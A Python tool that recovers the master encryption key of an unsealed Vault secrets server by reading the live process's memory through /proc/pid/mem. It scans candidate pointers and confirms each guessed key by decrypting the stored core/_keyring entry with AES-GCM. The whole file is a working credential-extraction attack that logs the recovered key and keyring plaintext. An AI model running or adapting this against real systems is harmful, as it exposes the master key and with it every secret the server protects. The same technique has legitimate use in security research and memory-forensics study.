#!/usr/bin/env python

import argparse
import json
import logging
import struct
from subprocess import Popen, PIPE

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.exceptions import InvalidTag

KEY_SIZE = 32
TAG_SIZE = 16
NONCE_SIZE = 12


def decrypt(key, associated_data, nonce, ciphertext, tag):
    decryptor = Cipher(
        algorithms.AES(key),
        modes.GCM(nonce, tag),
        backend=default_backend()
    ).decryptor()
    decryptor.authenticate_additional_data(associated_data)
    return decryptor.update(ciphertext) + decryptor.finalize()


def running_procs(name):
    subproc = Popen(['ps', '-o', 'pid,uid', '--no-headers', '-C', name], shell=False, stdout=PIPE)
    candidates = [line.split() for line in subproc.stdout]
    return candidates


def get_maps(pid, mode='w'):
    maps = []
    with open('/proc/{0}/maps'.format(pid), 'r') as f:
        for line in f:
            address, perms, offset, dev, inode, name = line.replace('\n', ';').split(None, 5)
            if int(offset, 16) != 0 or int(inode) != 0 or mode not in perms:
                continue
            addr_lo, addr_hi = [int(s, 16) for s in address.split('-')]
            score = int('[stack' in name) + int('[heap' in name) + int(':' in name)
            maps.append((score, addr_lo, addr_hi, name))
    maps.sort(reverse=True)
    return [m[1:] for m in maps]


def scan_addr_range(pid, addr_lo, addr_hi, name, check, try_harder=False):
    logging.info('Scanning pid {0} range {1:x}-{2:x} {3}'.format(pid, addr_lo, addr_hi, name))

    plen = struct.calcsize('@P')
    pointers = []
    p0 = 0
    p1 = 0
    p2 = 0
    with open('/proc/{0}/mem'.format(pid), 'rb') as f:
        f.seek(addr_lo, 0)
        for n in range((addr_hi - addr_lo) / plen):
            data = f.read(plen)
            p0, = struct.unpack('@P', data)
            if addr_lo <= p2 < addr_hi and (p1 == KEY_SIZE and p1 <= p0 <= 3*KEY_SIZE or try_harder):
                pointers.append(p2)
            p2 = p1
            p1 = p0

        logging.info('Found {0} candidate pointers'.format(len(pointers)))
        pointers.sort()
        for n, p in enumerate(pointers):
            f.seek(p, 0)
            key = f.read(KEY_SIZE)
            try:
                plaintext = check(key)
                logging.debug('Try {0} found valid key'.format(n))
                return key, plaintext
            except InvalidTag:
                pass
    return None, None


def get_check_func(entry):
    path = entry['Key'].encode('utf-8')
    data = entry['Value'].decode('base64')
    term = data[:4]
    version = data[4]
    nonce = data[5 : 5+NONCE_SIZE]
    ciphertext = data[5+NONCE_SIZE : -TAG_SIZE]
    tag = data[-TAG_SIZE:]
    logging.debug('Entry term {0!r} version {1!r}'.format(term, version))

    def check_v1(key):
        return decrypt(key, None, nonce, ciphertext, tag)

    def check_v2(key):
        return decrypt(key, path, nonce, ciphertext, tag)
    if version == '\x01':
        return check_v1
    elif version == '\x02':
        return check_v2
    else:
        raise RuntimeError('Unknown version {0!r} in entry'.format(version))


def main():
    logging.basicConfig(level=logging.INFO)

    parser = argparse.ArgumentParser(description='Recover master key from memory of unsealed vault')
    parser.add_argument('--pid', required=False, default=None,
                        help='Process id of the unsealed vault server process')
    parser.add_argument('--try-harder', required=False, default=False, action='store_true',
                        help='Try harder')
    parser.add_argument('--keyring', required=True, type=argparse.FileType('r'),
                        action='store', help='Path to encrypted core/_keyring file')
    args = parser.parse_args()

    if args.pid:
        procs = [(args.pid, 0)]
    else:
        procs = running_procs('vault')
        if not procs:
            logging.error('Cannot find vault server. Try setting --pid parameter')
            return

    entry = json.load(args.keyring)
    check = get_check_func(entry)

    for pid, uid in procs:
        logging.info('Trying pid {0}'.format(pid))
        for addr_lo, addr_hi, name in get_maps(pid):
            key, plaintext = scan_addr_range(pid, addr_lo, addr_hi, name, check,
                                             try_harder=args.try_harder)
            if key is not None:
                logging.info('Key {0}'.format(key.encode('hex')))
                logging.info('Plaintext {0}'.format(plaintext))
                return
    logging.info('Key not found')


if __name__ == '__main__':
    main()
